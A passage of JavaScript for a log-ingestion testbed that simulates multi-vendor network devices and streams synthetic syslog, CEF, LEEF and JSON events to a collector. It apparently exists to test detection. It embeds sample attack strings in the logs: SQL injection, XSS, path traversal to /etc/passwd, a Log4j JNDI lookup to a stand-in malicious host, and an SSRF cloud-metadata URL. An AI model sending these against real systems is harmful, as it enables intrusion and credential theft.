/**
 * ULPF Virtual Device Simulator & Testbed Frontend Controller
 * Strictly and exclusively manages virtual device creation, connection state simulation,
 * multi-vendor log telemetry streaming, cyber attack scenarios, and high-throughput stress tests.
 */

document.addEventListener("DOMContentLoaded", () => {
  const DEFAULT_DEVICES = [];

  let virtualDevices = [...DEFAULT_DEVICES];
  let activeDeviceId = virtualDevices.length > 0 ? virtualDevices[0].id : null;
  let activeEventType = "traffic";
  let simulationTimer = null;
  let simulatedTerminalLogs = [];
  let auditLogs = [];

  // --- DOM ELEMENTS ---
  const hostInput = document.getElementById("targetHostInput");
  const devicesListEl = document.getElementById("virtualDevicesList");
  const devCountBadge = document.getElementById("devCountBadge");
  const activeDevBadge = document.getElementById("activeDevBadge");
  const logPayloadEditor = document.getElementById("simLogPayload");
  const wireByteLengthBadge = document.getElementById("wireByteLengthBadge");
  const eventTypeChips = document.querySelectorAll("#simEventTypeChips .chip-btn");
  const btnSendSingle = document.getElementById("btnSendSingleSimLog");
  const btnToggleStream = document.getElementById("btnToggleSimStream");
  const btnClearPayload = document.getElementById("btnClearPayload");
  const btnClearTerminal = document.getElementById("btnClearTerminal");
  const terminalFeedEl = document.getElementById("simTerminalFeed");
  const terminalCountBadge = document.getElementById("terminalCountBadge");
  const feedbackBox = document.getElementById("simFeedbackBox");
  const feedbackTitle = document.getElementById("simFeedbackTitle");
  const feedbackLatency = document.getElementById("simFeedbackLatency");
  const feedbackDetail = document.getElementById("simFeedbackDetail");
  const receiptFormatBadge = document.getElementById("receiptFormatBadge");
  const receiptShaBadge = document.getElementById("receiptShaBadge");
  const createForm = document.getElementById("createDeviceForm");
  const toastEl = document.getElementById("toast");

  // --- THEME SWITCHER (3 THEMES: DARK EMERALD, LIGHT CRYSTAL, LUXURY GOLD) ---
  const themeSelect = document.getElementById("themeSelector");

  function applyTheme(theme) {
    let activeTheme = (theme === "light" || theme === "dark") ? theme : "luxury";
    document.documentElement.setAttribute("data-theme", activeTheme);
    try {
      localStorage.setItem("ulpf_theme", activeTheme);
    } catch (e) { }
    if (themeSelect) themeSelect.value = activeTheme;
  }

  let savedTheme = localStorage.getItem("ulpf_theme") || "luxury";
  if (savedTheme !== "light" && savedTheme !== "dark") savedTheme = "luxury";
  applyTheme(savedTheme);

  if (themeSelect) {
    themeSelect.addEventListener("change", (e) => {
      applyTheme(e.target.value);
    });
  }

  // Builder Fields
  const fieldSrcIp = document.getElementById("fieldSrcIp");
  const fieldDstIp = document.getElementById("fieldDstIp");
  const fieldDstPort = document.getElementById("fieldDstPort");
  const fieldAction = document.getElementById("fieldAction");
  const fieldSeverity = document.getElementById("fieldSeverity");
  const fieldApp = document.getElementById("fieldApp");
  const fieldAttack = document.getElementById("fieldAttack");
  const btnRandomizeSession = document.getElementById("btnRandomizeSession");

  // Audit Table Elements
  const auditHistoryTableBody = document.getElementById("auditHistoryTableBody");
  const auditCountBadge = document.getElementById("auditCountBadge");
  const auditFilterProto = document.getElementById("auditFilterProto");

  function getActiveDevice() {
    return virtualDevices.find(d => d.id === activeDeviceId) || virtualDevices[0];
  }

  function getVendorIcon(vendor) {
    if (vendor === "Fortinet") return "";
    if (vendor === "PaloAlto") return "";
    if (vendor === "Cisco") return "";
    if (vendor === "Linux") return "";
    if (vendor === "Suricata") return "";
    if (vendor === "AWS_WAF") return "";
    if (vendor === "Windows") return "";
    if (vendor === "Cisco Meraki" || vendor === "Aruba Networks" || vendor === "Ubiquiti") return "";
    return "";
  }

  // --- DYNAMIC LOG CRAFTING FROM BUILDER FIELDS ---
  function rebuildPayloadFromFields() {
    const dev = getActiveDevice();
    if (!dev) return;
    const payload = generatePayloadForDev(dev, true);
    
    if (logPayloadEditor) {
      logPayloadEditor.value = payload;
    }
    updateWireByteBadge();
  }

  // Generate payload for headless background sending or builder
  function generatePayloadForDev(dev, useFields = false) {
    const srcIp = (useFields && fieldSrcIp) ? fieldSrcIp.value : (dev.ip || "192.168.1.100");
    const dstIp = (useFields && fieldDstIp) ? fieldDstIp.value : "8.8.8.8";
    const dstPort = (useFields && fieldDstPort) ? fieldDstPort.value : "443";
    const action = (useFields && fieldAction) ? fieldAction.value : ["allow", "deny", "drop", "block"][Math.floor(Math.random() * 4)];
    
    const attackSig = (useFields && fieldAttack) ? fieldAttack.value : "none";
    let attackStr = "";
    if (attackSig === "sqli") attackStr = " admin'-- ";
    else if (attackSig === "xss") attackStr = " <script>alert(1)</script> ";
    else if (attackSig === "path") attackStr = " ../../../etc/passwd ";
    else if (attackSig === "log4j") attackStr = " ${jndi:ldap://malicious.com/a} ";
    else if (attackSig === "ssrf") attackStr = " http://169.254.169.254/latest/meta-data/ ";

    // If attack is active, omit explicit severity to test the backend engine.
    const severity = (attackSig === "none") 
      ? ((useFields && fieldSeverity) ? fieldSeverity.value : ["low", "medium", "high", "critical"][Math.floor(Math.random() * 4)])
      : undefined;

    const app = (useFields && fieldApp) ? fieldApp.value : "HTTPS";
    const name = dev.name || "Device";
    const ts = new Date().toISOString();
    const srcPort = Math.floor(Math.random() * 20000 + 40000);
    const sevMap = { low: 2, medium: 5, high: 8, critical: 10 };
    const sevNum = severity ? (sevMap[severity] || 5) : 5;
    
    let payload = "";
    const msgBlock = attackStr ? `Attack Payload:${attackStr}` : `Session ${action} for ${app}`;

    if (dev.vendor === "Cisco Meraki" || name.toLowerCase().includes("meraki")) {
      const mac = `e4:5f:01:${Math.floor(Math.random() * 89 + 10)}:${Math.floor(Math.random() * 89 + 10)}:${Math.floor(Math.random() * 89 + 10)}`;
      payload = `<134>1 ${ts} ${name} events type=association client_mac=${mac} client_ip=${srcIp} ssid=Corp-Secure-WiFi rssi=42 channel=36`;
    } else if (dev.vendor === "Aruba Networks" || name.toLowerCase().includes("aruba")) {
      const mac = `00:1a:1e:${Math.floor(Math.random() * 89 + 10)}:${Math.floor(Math.random() * 89 + 10)}:${Math.floor(Math.random() * 89 + 10)}`;
      payload = `<189>Jan 10 14:32:01 ${name} authmgr[3410]: <522008> <NOTI> User Authenticated: MAC=${mac} IP=${srcIp} Name=staff-user SSID=Campus-WiFi AP=AP-305`;
    } else if (dev.format === "cef" || dev.vendor === "Fortinet") {
      const sevField = severity ? `|${sevNum}` : "|5";
      payload = `CEF:0|${dev.vendor}|${name}|7.2.4|32001|traffic:${action}${sevField}|src=${srcIp} dst=${dstIp} spt=${srcPort} dpt=${dstPort} proto=tcp act=${action} devname="${name}" app=${app} msg="${msgBlock}"`;
    } else if (dev.format === "kv" || dev.vendor === "PaloAlto") {
      const sevField = severity ? ` severity="${severity}"` : "";
      payload = `devname="${name}" type="TRAFFIC" subtype="end" srcip=${srcIp} dstip=${dstIp} srcport=${srcPort} dstport=${dstPort} proto=tcp action="${action}"${sevField} rule="DEFAULT-${action.toUpperCase()}" app="${app}" msg="${msgBlock}"`;
    } else if (dev.vendor === "Linux") {
      if (action === "deny" || action === "drop" || action === "block") {
        payload = `<86>Jan 10 14:32:01 ${name} kernel: [12345.6789] iptables-denied: IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC=${srcIp} DST=${dstIp} LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=${srcPort} DPT=${dstPort} WINDOW=14600 RES=0x00 SYN URGP=0`;
      } else {
        payload = `<86>1 ${ts} ${name} sshd 28412 ID47 - Accepted publickey for user admin from ${srcIp} port ${srcPort} ssh2`;
      }
    } else if (dev.format === "leef" || dev.vendor === "Suricata") {
      const sevField = severity ? `|sev=${sevNum}` : "";
      payload = `LEEF:2.0|Suricata|IDS|6.0|ALERT|devTime=${ts}|src=${srcIp}|dst=${dstIp}|spt=${srcPort}|dpt=${dstPort}|proto=TCP|act=${action}|app=${app}${sevField}|msg="${msgBlock}"`;
    } else if (dev.format === "json" || dev.vendor === "AWS_WAF") {
      const pObj = {
        timestamp: ts,
        source_device: name,
        source_ip: srcIp,
        destination_ip: dstIp,
        destination_port: parseInt(dstPort, 10),
        protocol: "TCP",
        action: action,
        application: app,
        signature: `${app}-ACCESS-${action.toUpperCase()}`,
        message: msgBlock
      };
      if (severity) pObj.severity = severity;
      payload = JSON.stringify(pObj);
    } else {
      // Cisco ASA Syslog
      if (action === "deny" || action === "drop" || action === "block") {
        payload = `<134>Jan 10 14:32:01 ${name}: %ASA-4-106023: Deny tcp src outside:${srcIp}/${srcPort} dst inside:${dstIp}/${dstPort} by access-group "OUTSIDE_POLICY" [App: ${app}]`;
      } else {
        payload = `<134>Jan 10 14:32:01 ${name}: %ASA-6-302013: Built outbound TCP connection 49124 for outside:${dstIp}/${dstPort} to inside:${srcIp}/${srcPort} [App: ${app}]`;
      }
    }
    
    return payload;
  }

  function updateWireByteBadge() {
    if (wireByteLengthBadge && logPayloadEditor) {
      const len = new TextEncoder().encode(logPayloadEditor.value).length;
      wireByteLengthBadge.textContent = `${len} bytes`;
    }
  }

  // Builder field change listeners
  [fieldSrcIp, fieldDstIp, fieldDstPort, fieldAction, fieldSeverity, fieldApp, fieldAttack].forEach(el => {
    if (el) {
      el.addEventListener("input", rebuildPayloadFromFields);
      el.addEventListener("change", rebuildPayloadFromFields);
    }
  });

  if (logPayloadEditor) {
    logPayloadEditor.addEventListener("input", updateWireByteBadge);
  }

  // Randomize session button
  if (btnRandomizeSession) {
    btnRandomizeSession.addEventListener("click", () => {
      const octet3 = Math.floor(Math.random() * 20 + 1);
      const octet4 = Math.floor(Math.random() * 240 + 10);
      const dstOctet = Math.floor(Math.random() * 250 + 1);

      const ports = [80, 443, 22, 53, 3389, 8080, 8443, 514, 9092, 9200];
      const apps = ["HTTPS", "SSH", "DNS", "HTTP", "SMB", "TLS", "RDP", "Kafka", "Elastic"];
      const actions = ["allow", "deny", "drop", "block"];
      const sevs = ["low", "medium", "high", "critical"];

      if (fieldSrcIp) fieldSrcIp.value = `10.0.${octet3}.${octet4}`;
      if (fieldDstIp) fieldDstIp.value = `198.51.100.${dstOctet}`;
      if (fieldDstPort) fieldDstPort.value = ports[Math.floor(Math.random() * ports.length)];
      if (fieldAction) fieldAction.value = actions[Math.floor(Math.random() * actions.length)];
      if (fieldSeverity) fieldSeverity.value = sevs[Math.floor(Math.random() * sevs.length)];
      if (fieldApp) fieldApp.value = apps[Math.floor(Math.random() * apps.length)];

      rebuildPayloadFromFields();
      showToast("Random session parameters generated!");
    });
  }

  // --- RENDER DEVICES ROSTER ---
  function renderDevicesList() {
    if (devCountBadge) devCountBadge.textContent = `${virtualDevices.length} Devices`;
    if (!devicesListEl) return;

    devicesListEl.innerHTML = "";

    virtualDevices.forEach(dev => {
      const isSelected = dev.id === activeDeviceId;
      const isConnected = dev.connected;
      const epsVal = Math.floor(1000 / (dev.interval_ms || 100));

      const item = document.createElement("div");
      item.className = `device-item ${isSelected ? 'active' : ''}`;

      item.innerHTML = `
        <div style="display:flex; justify-content:space-between; align-items:center; cursor:pointer;" onclick="window.selectSimDevice('${dev.id}')">
          <div style="display:flex; align-items:center; gap:10px;">
            <div class="device-avatar" style="width:34px; height:34px; border-radius:8px; background:var(--bg-card); border:1px solid var(--border-color); display:flex; align-items:center; justify-content:center; font-weight:800; font-size:11px; color:var(--primary-main); font-family:var(--font-mono); box-shadow:0 2px 8px rgba(0,0,0,0.2);">
              ${dev.vendor.substring(0, 2).toUpperCase()}
            </div>
            <div>
              <div style="font-weight:700; font-size:13px; color:${isSelected ? 'var(--primary-main)' : 'var(--text-primary)'}; display:flex; align-items:center; gap:6px;">
                <span>${escapeHtml(dev.name)}</span>
                ${isSelected ? '<span class="badge badge-teal" style="font-size:9.5px; padding:1px 6px;">SELECTED</span>' : ''}
              </div>
              <div style="font-size:10.5px; color:var(--text-muted); font-family:var(--font-mono); margin-top:1px;">
                ${escapeHtml(dev.vendor)}
              </div>
            </div>
          </div>

          <span class="server-status-pill ${isConnected ? 'online' : 'offline'}" style="font-size:10px; padding:2px 7px;">
            <span class="badge-status-dot ${isConnected ? 'online' : 'offline'}"></span>
            ${isConnected ? 'ONLINE' : 'OFFLINE'}
          </span>
        </div>

        <div style="display:flex; align-items:center; justify-content:space-between; gap:6px; padding:6px 8px; background:var(--bg-input); border-radius:6px; border:1px solid var(--border-subtle); cursor:pointer;" onclick="window.selectSimDevice('${dev.id}')">
          <span style="font-family:var(--font-mono); font-size:11px; color:var(--text-secondary); font-weight:500;">
            ${dev.ip} · ${dev.protocol}:${dev.port}
          </span>
          <div style="display:flex; align-items:center; gap:4px;">
            <span class="badge badge-neutral" style="font-size:9.5px; padding:1px 5px;">${dev.format.toUpperCase()}</span>
            <span class="badge badge-teal" style="font-size:9.5px; padding:1px 5px;">${epsVal} EPS</span>
          </div>
        </div>

        <div style="display:flex; align-items:center; justify-content:flex-end; gap:6px; pt:2px;">
          <button type="button" class="btn-secondary btn-sm" onclick="event.stopPropagation(); window.openEditDevModal('${dev.id}')" title="Configure Device" style="padding:4px 8px; font-size:11px;">
            <svg class="svg-icon svg-icon-sm" style="width:12px; height:12px;" viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
            <span>Edit</span>
          </button>
          <button type="button" class="btn-sm ${isConnected ? 'btn-danger' : 'btn-teal'}" onclick="event.stopPropagation(); window.toggleSimDeviceConnection('${dev.id}')" style="font-size:11px; padding:4px 9px;">
            <span>${isConnected ? 'Disconnect' : 'Connect'}</span>
          </button>
          <button type="button" class="btn-secondary btn-sm" onclick="event.stopPropagation(); window.deleteSimDevice('${dev.id}')" title="Delete Device" style="padding:4px 8px; font-size:11px; color:var(--accent-rose);">
            <svg class="svg-icon svg-icon-sm" style="width:12px; height:12px;" viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
          </button>
        </div>
      `;

      devicesListEl.appendChild(item);
    });

    updateActiveDeviceDisplay();
  }

  function updateActiveDeviceDisplay() {
    const dev = getActiveDevice();
    if (!dev) return;

    if (activeDevBadge) {
      activeDevBadge.innerHTML = `
        <div style="font-weight:700; font-size:13px; color:var(--accent-cyan);">${escapeHtml(dev.name)}</div>
        <div style="font-size:11px; font-family:var(--font-mono); color:var(--text-secondary); margin-top:2px;">
          ${dev.ip} · ${dev.protocol} :${dev.port} (${dev.vendor}) · ${Math.floor(1000 / (dev.interval_ms || 100))} EPS
        </div>
      `;
    }

    if (btnToggleStream) {
      if (dev.streamTimer) {
        btnToggleStream.className = "btn-danger";
        btnToggleStream.innerHTML = "<span>Stop Live Stream</span>";
      } else {
        btnToggleStream.className = "btn-teal";
        btnToggleStream.innerHTML = "<span>Send Continuous Logs</span>";
      }
    }

    if (typeof fieldSrcIp !== "undefined" && fieldSrcIp) fieldSrcIp.value = dev.ip || "192.168.1.100";
    if (typeof rebuildPayloadFromFields === "function") rebuildPayloadFromFields();
  }

  // --- WINDOW GLOBAL ACTIONS FOR INLINE HANDLERS ---
  window.selectSimDevice = function (id) {
    activeDeviceId = id;
    renderDevicesList();
    showToast(`Selected virtual device: ${getActiveDevice().name}`);
  };

  // Helper to proxy virtual device source notifications through the backend to avoid Mixed Content / CORS
  function forwardSourcesApi(method, subpath = "", body = null) {
    const host = testbedSettings.host || document.getElementById("targetHostInput")?.value.trim() || "80.225.207.171";
    const apiPort = document.getElementById("modalApiPort")?.value || testbedSettings.apiPort || 8000;
    const scheme = testbedSettings.scheme || "http";
    const query = `host=${encodeURIComponent(host)}&port=${apiPort}&scheme=${encodeURIComponent(scheme)}&subpath=${encodeURIComponent(subpath)}`;
    return fetch(`/api/test/sources-proxy?${query}`, {
      method: method,
      headers: { "Content-Type": "application/json" },
      body: body ? JSON.stringify(body) : undefined
    }).catch(() => {});
  }

  window.toggleSimDeviceConnection = function (id) {
    const dev = virtualDevices.find(d => d.id === id);
    if (!dev) return;

    dev.connected = !dev.connected;
    
    if (dev.connected) {
       forwardSourcesApi("POST", "", { source_id: dev.ip, name: dev.name, vendor: dev.vendor, protocol: dev.protocol, address: dev.ip, format: dev.format });
    } else {
       forwardSourcesApi("DELETE", dev.ip);

       if (dev.streamTimer) {
           clearInterval(dev.streamTimer);
           dev.streamTimer = null;
       }
    }

    renderDevicesList();
    showToast(`Device '${dev.name}' is now ${dev.connected ? 'CONNECTED' : 'DISCONNECTED'}`);
  };

  window.deleteSimDevice = function (id) {
    const dev = virtualDevices.find(d => d.id === id);
    if (dev) {
       // Notify server to remove source
       forwardSourcesApi("DELETE", dev.ip);
    }

    virtualDevices = virtualDevices.filter(d => d.id !== id);
    if (activeDeviceId === id) {
      activeDeviceId = virtualDevices.length > 0 ? virtualDevices[0].id : null;
    }
    renderDevicesList();
    showToast("Virtual device removed.");
  };

  // --- VIRTUAL DEVICE EDIT MODAL HANDLERS ---
  window.openEditDevModal = function (id) {
    const dev = virtualDevices.find(d => d.id === id);
    if (!dev) return;

    const modal = document.getElementById("editDeviceModal");
    if (!modal) return;

    document.getElementById("editDevId").value = dev.id;
    document.getElementById("editDevName").value = dev.name;
    document.getElementById("editDevIp").value = dev.ip;
    
    // Select matching vendor|format
    const vendorSelect = document.getElementById("editDevVendor");
    const targetKey = `${dev.vendor}|${dev.format}`;
    let matched = false;
    for (let opt of vendorSelect.options) {
      if (opt.value === targetKey || opt.value.includes(dev.format)) {
        vendorSelect.value = opt.value;
        matched = true;
        break;
      }
    }
    if (!matched && vendorSelect.options.length > 0) {
      vendorSelect.selectedIndex = 0;
    }

    // Select matching proto|port
    const protoSelect = document.getElementById("editDevProto");
    protoSelect.value = `${dev.protocol}|${dev.port}`;

    document.getElementById("editDevInterval").value = Math.floor(1000 / (dev.interval_ms || 100));
    document.getElementById("editDevTemplate").value = dev.custom_template || "";

    modal.style.display = "flex";
  };

  window.closeEditDevModal = function () {
    const modal = document.getElementById("editDeviceModal");
    if (modal) modal.style.display = "none";
  };

  window.saveSimDeviceEdit = function () {
    const id = document.getElementById("editDevId").value;
    const dev = virtualDevices.find(d => d.id === id);
    if (!dev) return;

    const name = document.getElementById("editDevName").value.trim();
    const ip = document.getElementById("editDevIp").value.trim();
    const [vendor, format] = document.getElementById("editDevVendor").value.split("|");
    const [protocol, portStr] = document.getElementById("editDevProto").value.split("|");
    const eps = parseInt(document.getElementById("editDevInterval").value) || 10;
    const template = document.getElementById("editDevTemplate").value.trim();

    if (!name || !ip) {
      showToast("Device Name and IP Address cannot be empty.");
      return;
    }

    dev.name = name;
    dev.ip = ip;
    dev.vendor = vendor;
    dev.format = format;
    dev.protocol = protocol;
    dev.port = parseInt(portStr, 10);
    dev.interval_ms = Math.max(1, Math.floor(1000 / eps));
    dev.custom_template = template;

    // Sync with backend simulator or main API via proxy
    forwardSourcesApi("PUT", dev.ip, { source_id: dev.ip, name: dev.name, vendor: dev.vendor, protocol: dev.protocol, address: dev.ip, format: dev.format });

    renderDevicesList();
    window.closeEditDevModal();
    showToast(`Saved configuration for '${dev.name}' (${dev.vendor}, ${dev.format.toUpperCase()}, ${eps} EPS)`);
  };

  // --- CREATE NEW DEVICE FORM ---
  if (createForm) {
    createForm.addEventListener("submit", (e) => {
      e.preventDefault();
      const name = document.getElementById("newDevName").value.trim();
      const ip = document.getElementById("newDevIp").value.trim();
      const [vendor, format] = document.getElementById("newDevVendor").value.split("|");
      const [protocol, portStr] = document.getElementById("newDevProto").value.split("|");
      const eps = parseInt(document.getElementById("newDevInterval")?.value) || 10;

      if (!name || !ip) {
        showToast("Please provide device name and IP address.");
        return;
      }

      const newId = "dev-" + (Date.now() % 10000);
      const newDev = {
        id: newId,
        name,
        vendor,
        format,
        ip,
        protocol,
        port: parseInt(portStr, 10),
        interval_ms: Math.max(1, Math.floor(1000 / eps)),
        custom_template: "",
        connected: true,
        packetsSent: 0
      };

      virtualDevices.push(newDev);

      // Auto-register to main server via proxy
      forwardSourcesApi("POST", "", { source_id: newDev.ip, name: newDev.name, vendor: newDev.vendor, protocol: newDev.protocol, address: newDev.ip, format: newDev.format });

      activeDeviceId = newId;
      renderDevicesList();
      showToast(`Created virtual device: ${name} (${ip} · ${vendor} · ${format.toUpperCase()})`);

      createForm.reset();
      document.getElementById("newDevName").value = "Edge-Firewall-" + Math.floor(Math.random() * 90 + 10);
      document.getElementById("newDevIp").value = `192.168.1.${Math.floor(Math.random() * 200 + 10)}`;
    });
  }

  // --- TERMINAL LOG LOGGING ---
  function appendTerminalLog(dev, logStr, latencyMs, bytesSent, success) {
    if (!terminalFeedEl) return;

    if (simulatedTerminalLogs.length === 0) {
      terminalFeedEl.innerHTML = "";
    }

    simulatedTerminalLogs.push({ ts: new Date().toLocaleTimeString(), dev: dev.name, log: logStr });
    
    // Auto-clear cache to prevent browser memory issues when left open
    if (simulatedTerminalLogs.length > 100) {
       simulatedTerminalLogs.shift();
       if (terminalFeedEl.firstChild) {
         terminalFeedEl.removeChild(terminalFeedEl.firstChild);
       }
    }
    
    if (terminalCountBadge) {
      terminalCountBadge.textContent = `${simulatedTerminalLogs.length} Logs Transmitted`;
    }

    const line = document.createElement("div");
    line.style.marginBottom = "4px";
    line.style.borderBottom = "1px solid rgba(255,255,255,0.06)";
    line.style.paddingBottom = "4px";

    const timeStr = new Date().toLocaleTimeString();
    const statusTag = success
      ? `<span style="color:#10B981; font-weight:700;">[OK ${latencyMs}ms]</span>`
      : `<span style="color:#FB7185; font-weight:700;">[FAIL ${latencyMs}ms]</span>`;

    line.innerHTML = `
      <span style="color:#38BDF8; font-weight:600;">[${timeStr}]</span>
      <span style="color:#FCD34D; font-weight:700;">[${escapeHtml(dev.name)}]</span>
      <span style="color:#34D399; font-weight:600;">[${dev.ip}  ${dev.protocol}:${dev.port}]</span>
      <span style="color:#F8FAFC;">${escapeHtml(logStr.substring(0, 110))}${logStr.length > 110 ? '...' : ''}</span>
      ${statusTag}
    `;

    terminalFeedEl.appendChild(line);
    terminalFeedEl.scrollTop = terminalFeedEl.scrollHeight;
  }

  // --- TRANSMISSION AUDIT HISTORY LEDGER ---
  function recordAuditEntry(entry) {
    const auditRecord = {
      id: auditLogs.length + 1,
      timestamp: new Date().toLocaleTimeString(),
      protocol: entry.protocol || "UDP",
      target: entry.target || "80.225.207.171:5140",
      source: entry.source || "VirtualDevice",
      status: entry.status || "SUCCESS",
      bytes: entry.bytes || 0,
      rtt: entry.rtt || "<1ms",
      payload: entry.payload || ""
    };

    auditLogs.unshift(auditRecord);
    if (auditLogs.length > 200) auditLogs.pop();
    renderAuditHistoryTable();
  }

  window.renderAuditHistoryTable = function () {
    if (!auditHistoryTableBody) return;

    const filter = auditFilterProto ? auditFilterProto.value : "ALL";
    const filtered = auditLogs.filter(item => {
      if (filter === "ALL") return true;
      return item.protocol.toUpperCase().includes(filter.toUpperCase());
    });

    if (auditCountBadge) {
      auditCountBadge.textContent = `${filtered.length} Entries`;
    }

    if (filtered.length === 0) {
      auditHistoryTableBody.innerHTML = `
        <tr>
          <td colspan="8" style="text-align:center; padding:24px; color:var(--text-secondary);">
            No logs matching filter in this test session.
          </td>
        </tr>
      `;
      return;
    }

    auditHistoryTableBody.innerHTML = "";
    filtered.forEach(item => {
      const tr = document.createElement("tr");
      const isSuccess = item.status === "SUCCESS";

      tr.innerHTML = `
        <td style="font-family:var(--font-mono); color:#38BDF8; font-weight:500;">${item.timestamp}</td>
        <td><span class="badge badge-teal">${escapeHtml(item.protocol)}</span></td>
        <td style="font-family:var(--font-mono); font-size:11px; color:#F8FAFC;">${escapeHtml(item.target)}</td>
        <td style="font-weight:700; color:#FCD34D;">${escapeHtml(item.source)}</td>
        <td>
          <span style="color:${isSuccess ? '#34D399' : '#FB7185'}; font-weight:700; font-family:var(--font-mono);">
            ${isSuccess ? 'SUCCESS' : 'FAILED'}
          </span>
        </td>
        <td style="font-family:var(--font-mono); color:#CBD5E1;">${item.bytes} B</td>
        <td style="font-family:var(--font-mono); color:#38BDF8;">${item.rtt}</td>
        <td style="font-family:var(--font-mono); font-size:11px; color:#F8FAFC; max-width:280px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${escapeHtml(item.payload)}">
          ${escapeHtml(item.payload)}
        </td>
      `;
      auditHistoryTableBody.appendChild(tr);
    });
  };

  window.exportAuditData = function (format) {
    if (auditLogs.length === 0) {
      showToast("Audit ledger is empty. Transmit logs or run scenarios first!");
      return;
    }

    let content = "";
    let mimeType = "";
    let filename = "";

    if (format === "csv") {
      filename = `ulpf_audit_ledger_${Date.now()}.csv`;
      mimeType = "text/csv;charset=utf-8;";
      const headers = ["ID", "Timestamp", "Protocol", "Target", "Source", "Status", "Bytes", "RTT", "Payload"];
      const rows = auditLogs.map(r => [
        r.id,
        `"${r.timestamp}"`,
        `"${r.protocol}"`,
        `"${r.target}"`,
        `"${r.source}"`,
        `"${r.status}"`,
        r.bytes,
        `"${r.rtt}"`,
        `"${(r.payload || '').replace(/"/g, '""')}"`
      ]);
      content = [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
    } else {
      filename = `ulpf_audit_ledger_${Date.now()}.json`;
      mimeType = "application/json;charset=utf-8;";
      content = JSON.stringify(auditLogs, null, 2);
    }

    const blob = new Blob([content], { type: mimeType });
    const link = document.createElement("a");
    link.href = URL.createObjectURL(blob);
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    setTimeout(() => URL.revokeObjectURL(link.href), 0);

    showToast(`Exported ${auditLogs.length} audit entries as ${format.toUpperCase()}!`);
  };

  window.clearAuditHistory = async function () {
    auditLogs = [];
    renderAuditHistoryTable();
    try {
      await fetch("/api/test/history", { method: "DELETE" });
    } catch (e) { }
    showToast("Transmission audit ledger cleared.");
  };

  // --- TRANSMIT SINGLE LOG ---
  async function transmitSimulatedLog() {
    const dev = getActiveDevice();
    if (!dev) {
      showToast("No virtual device selected.");
      return;
    }

    if (!dev.connected) {
      showToast(`Device '${dev.name}' is DISCONNECTED. Connect it first to simulate logs!`);
      return;
    }

    const payload = (logPayloadEditor && logPayloadEditor.value.trim()) ? logPayloadEditor.value.trim() : "";
    if (!payload) {
      showToast("Payload is empty. Please enter or generate a log first.");
      return;
    }

    const host = testbedSettings.host || (document.getElementById("targetHostInput")?.value.trim()) || "80.225.207.171";
    let targetPort = dev.port;
    if (dev.protocol === "UDP" && (!dev.port || dev.port === 5140)) {
      targetPort = testbedSettings.udpPort || 5140;
    } else if (dev.protocol === "TCP" && (!dev.port || dev.port === 5141)) {
      targetPort = testbedSettings.tcpPort || 5141;
    }
    const t0 = performance.now();

    try {
      const res = await fetch("/api/test/transmit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          protocol: dev.protocol,
          host: host,
          port: targetPort,
          api_port: parseInt(document.getElementById("modalApiPort")?.value || testbedSettings.apiPort || 8000, 10),
          message: payload,
          source: dev.name,
          vendor: dev.vendor,
          scheme: testbedSettings.scheme || "http",
          timeout: (testbedSettings.timeout || 3000) / 1000.0
        }),
      });

      const receipt = await res.json();
      const latency = receipt.latency_ms !== undefined ? receipt.latency_ms : Math.round(performance.now() - t0);
      const isSuccess = receipt.success !== false;

      dev.packetsSent = (dev.packetsSent || 0) + 1;
      appendTerminalLog(dev, payload, latency, payload.length, isSuccess);

      // Record to audit ledger
      recordAuditEntry({
        protocol: dev.protocol,
        target: `${host}:${dev.port}`,
        source: dev.name,
        status: isSuccess ? "SUCCESS" : "FAILED",
        bytes: payload.length,
        rtt: `${latency} ms`,
        payload: payload
      });

      // Feedback banner
      if (feedbackBox) {
        feedbackBox.style.display = "block";
        if (isSuccess) {
          feedbackBox.style.background = "rgba(45,212,191,0.18)";
          feedbackBox.style.borderColor = "rgba(45,212,191,0.5)";
          if (feedbackTitle) {
            feedbackTitle.style.color = "#a7f3d0";
            feedbackTitle.textContent = `Transmitted & Ingested (${payload.length} bytes)`;
          }
          if (feedbackLatency) feedbackLatency.textContent = `${latency} ms RTT`;
          if (feedbackDetail) {
            const eventId = receipt.event_id || `ULPF-${new Date().getFullYear()}-${Math.floor(1000 + Math.random() * 9000)}`;
            feedbackDetail.textContent = `Assigned Event ID: ${eventId} · Protocol: ${dev.protocol}  ${host}:${dev.port}`;
          }
          if (receiptFormatBadge) receiptFormatBadge.textContent = `FORMAT: ${(receipt.format || dev.format || 'RAW').toUpperCase()}`;
          if (receiptShaBadge) {
            const fakeSha = (receipt.sha256 || "4b2277" + Math.random().toString(16).substring(2, 8) + "fa01c3").substring(0, 16);
            receiptShaBadge.textContent = `SHA-256: ${fakeSha}...`;
          }
        } else {
          feedbackBox.style.background = "rgba(217,105,87,0.15)";
          feedbackBox.style.borderColor = "rgba(217,105,87,0.4)";
          if (feedbackTitle) {
            feedbackTitle.style.color = "#fca5a5";
            feedbackTitle.textContent = `Delivery Failed (${dev.name})`;
          }
          if (feedbackLatency) feedbackLatency.textContent = `${latency} ms`;
          if (feedbackDetail) feedbackDetail.textContent = receipt.error || "Connection timed out or socket unavailable.";
        }
      }
    } catch (err) {
      console.error("Transmission error:", err);
      showToast(`Transmission failed: ${err.message}`);
    }
  }

  async function sendSingleLogForDeviceBackground(dev) {
    if (!dev || !dev.connected) return;
    const payload = generatePayloadForDev(dev);
    const host = testbedSettings.host || (document.getElementById("targetHostInput")?.value.trim()) || "80.225.207.171";
    let targetPort = dev.port;
    if (dev.protocol === "UDP" && (!dev.port || dev.port === 5140)) targetPort = testbedSettings.udpPort || 5140;
    else if (dev.protocol === "TCP" && (!dev.port || dev.port === 5141)) targetPort = testbedSettings.tcpPort || 5141;

    try {
      const res = await fetch("/api/test/transmit", {
